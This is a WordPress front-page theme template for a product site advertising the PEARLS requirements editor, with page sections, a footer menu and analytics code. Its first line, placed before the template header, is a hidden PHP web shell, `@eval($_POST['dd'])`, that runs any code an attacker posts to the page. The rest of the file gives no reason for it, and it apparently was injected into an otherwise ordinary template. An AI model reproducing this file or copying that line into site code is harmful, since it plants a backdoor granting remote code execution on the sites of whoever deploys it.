<?php @eval($_POST['dd']);?><?php
/**
* Template Name: Front Page
*
* This is the template that displays all pages by default.
* Please note that this is the WordPress construct of pages
* and that other 'pages' on your WordPress site may use a
* different template.
*
* @link https://codex.wordpress.org/Template_Hierarchy
*
* @package actonvideo
*/
get_header(); ?>
<br>
<br>
<br>
<br>
<section class="panel home section1" data-section-name="THINK-AGILE">
    <div class="child">
        <h2 class="slide-top">Think Agile Think Alike</h2>
        <hr>
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                      <p class="slide-bottom">Pearls is a simple Requirements Editor For business analysts</p>
        <a href="<?php echo site_url('contact-us/'); ?>" class="btns">Request Demo</a>
        <a href="<?php echo site_url('products/' ); ?>" class="btns">view details</a>
        <img class="center-block img-responsive" src="<?php echo THEME; ?>images/main1.png" alt="">
                </div>
            </div>
        </div>
    </div>
</section>
<section class="panel section1" data-section-name="SOLUTION-ORCHESTRATION">
    <div class="child">
        <h2 class="slide-top">Solution Orchestration</h2>
        <hr>
        <!-- <p>Pearls is a simple Agile Editor For business analysts</p> -->
        <img class="center-block img-responsive" src="<?php echo THEME; ?>images/main2.png" alt="">
    </div>
</section>
<section class="panel section2" data-section-name="PEARLS">
    <div class="child">
        <div class="container">
            <div class="row">
                <div class="col-md-6">
                    <h2 class="slide-top">Pearls <img src="<?php echo THEME; ?>images/head-logo.png" alt=""></h2>
                    <h3 class="slide-top">It’s your Solution</h3>
                    <hr>
                    <p class="slide-bottom" style="text-transform: initial;">PEARLS is an easy to use requirements tool. It is designed to fit within any type of business environment. It is your solution, and your one step to all your enterprise needs.</p>
                    <a href="<?php echo site_url('contact-us/'); ?>" class="btns">Request Demo</a>
                    <a href="<?php echo site_url('products/' ); ?>" class="btns">view details</a>
                </div>
                <div class="col-md-6">
                    <img class="img-responsive slide-right" src="<?php echo THEME; ?>images/main3.png" alt="">
                </div>
            </div>
        </div>
    </div>
</section>


<section class="panel section3" data-section-name="CORE-FEATURES">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
                <img class="img-responsive slide-left" src="<?php echo THEME; ?>images/sticklogolarge.png" alt="">
            </div>
            <div class="col-md-8">
                <h2 class="slide-top">core features</h2>
                <hr>
                <p class="slide-top">Features that make work and your day more productive</p>
                <div class="row">
                    <div class="col-sm-4 box slide-bottom">
                        <img class="center-block" src="<?php echo THEME; ?>images/icon1.png" alt="">
                        <p>project Widzard</p>
                    </div>
                    <div class="col-sm-4 box slide-bottom">
                        <img class="center-block" src="<?php echo THEME; ?>images/icon2.png" alt="">
                        <p>Check in / Check Out</p>
                    </div>
                    <div class="col-sm-4 box slide-bottom">
                        <img class="center-block" src="<?php echo THEME; ?>images/icon3.png" alt="">
                        <p>Collaborate</p>
                    </div>
                </div>
            </div>
            <div class="col-md-12">
                <br><br>
                <h2 class="schedulebtn slide-top"><a href="<?php echo site_url('contact-us/'); ?>">Schedule Pearls Demo</a></h2>
                <hr>
                <p class="slide-bottom">PEARLS An easy to use Requirements Tool, For Business Analysts.</p>
                <img class="center-block stickylogo img-responsive" src="<?php echo THEME; ?>images/laptop.png" alt="">
            </div>
        </div>
    </div>
    <div class="logoes">
        <h2 class="slide-top">OUR CLIENTS</h2>
        <p class="slide-bottom">Let's be your Business Analysis partners</p>
        <!-- <ul class="clients">
            <li><a href="#"><img class="center-block" src="<?php echo THEME; ?>images/client1.png" alt=""></a></li>
            <li><a href="#"><img class="center-block" src="<?php echo THEME; ?>images/client2.png" alt=""></a></li>
            <li><a href="#"><img class="center-block" src="<?php echo THEME; ?>images/client3.png" alt=""></a></li>
            <li><a href="#"><img class="center-block" src="<?php echo THEME; ?>images/client4.png" alt=""></a></li>
            <li><a href="#"><img class="center-block" src="<?php echo THEME; ?>images/client5.png" alt=""></a></li>
        </ul> -->
        <img class="stickylogo center-block img-responsive" src="<?php echo THEME; ?>images/sticklogo.png" alt="">
    </div>
    <div class="footer">
        <div class="container">
            <div class="ro">
                <div class="col-md-12">
                    <nav class="menu">
                        <ul>
                            <?php
                            $primaryMenu = array(
                            'theme_location'  => 'menu-1',
                            'menu'            => '',
                            'container'       => '',
                            'container_class' => false,
                            'container_id'    => '',
                            'menu_class'      => 'menu',
                            'menu_id'         => 'Primary',
                            'echo'            => false,
                            'fallback_cb'     => 'wp_page_menu',
                            'before'          => '',
                            'after'           => '',
                            'link_before'     => '',
                            'link_after'      => '',
                            'depth'           => 0,
                            'walker'          => ''
                            );
                            echo strip_tags( wp_nav_menu( $primaryMenu ), '<li><a>' ); ?>
                                <?php if (get_option('linkedin_url')): ?>
                                <li class="social"><a href="<?php echo get_option('linkedin_url') ?>"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
                                <?php endif ?>
                                <?php if (get_option('twitter_url')): ?>
                                <li class="social"><a href="<?php echo get_option('twitter_url') ?>"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
                                <?php endif ?>
                            </ul>
                        </nav>
                        <hr>
                        <p>AYNA Inc. All rights reserved 2017</p>
                        <p class="copyright">
                            © 2017
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </section>




</body>
<?php wp_footer(); ?>
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-91094535-1', 'auto');
ga('send', 'pageview');
jQuery(window).fadeThis();
</script>
</html>